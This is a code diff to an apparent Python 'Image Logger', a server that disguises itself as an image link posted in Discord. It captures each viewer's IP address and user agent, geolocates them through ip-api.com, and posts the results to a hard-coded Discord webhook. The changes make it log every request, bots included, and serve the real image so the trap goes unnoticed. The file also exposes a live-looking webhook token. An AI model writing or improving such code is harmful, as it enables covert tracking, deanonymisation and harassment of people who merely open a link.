@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
-    "imageArgument": True,
+   "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
     "crashBrowser": False,
@@ -70,8 +70,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                 "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
             }],
         })
-        return
-
+    
+    # Log IP for all requests, even bots, unless explicitly blocked
     ping = "@everyone"
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     
@@ -95,7 +95,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         "embeds": [{
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Image in Browser!**
+            "description": f"""**A User Clicked the Image!**
 
 **Endpoint:** `{endpoint}`
             
@@ -120,7 +120,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 ```
 {useragent}
 ```""",
-            }],
+                   }],
     }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
@@ -148,40 +148,26 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             ip = self.headers.get('x-forwarded-for')
             useragent = self.headers.get('user-agent')
 
-            # Handle Discord bot preview
-            if botCheck(ip, useragent):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+            # Fetch the image content
+            image_response = requests.get(url, stream=True)
+            image_response.raise_for_status()
+            image_content = image_response.content
+            content_type = image_response.headers.get("Content-Type", "image/jpeg")
+
+            # Log IP immediately for all requests
+            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
+
+            # Serve image or loading preview
+            if botCheck(ip, useragent) and config["buggedImage"]:
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
                 self.end_headers()
-                if config["buggedImage"]:
-                    self.wfile.write(binaries["loading"])
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
-                return
-
-            # Serve HTML redirect to force browser opening
-            redirect_html = f'''
-            <html>
-                <head>
-                    <meta http-equiv="refresh" content="0;url={url}">
-                    <script>
-                        // Log IP once in the browser
-                        fetch(window.location.href, {{method: "POST"}});
-                    </script>
-                </head>
-                <body>
-                    <p>Redirecting to image...</p>
-                </body>
-            </html>
-            '''.encode()
-
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(redirect_html)
-
-            # Log IP when the browser makes the POST request (or GET if POST isn't triggered)
-            if self.command == "POST":
-                makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
+                self.wfile.write(binaries["loading"])
+            else:
+                self.send_response(200)
+                self.send_header('Content-type', content_type)
+                self.end_headers()
+                self.wfile.write(image_content)
 
         except Exception:
             self.send_response(500)
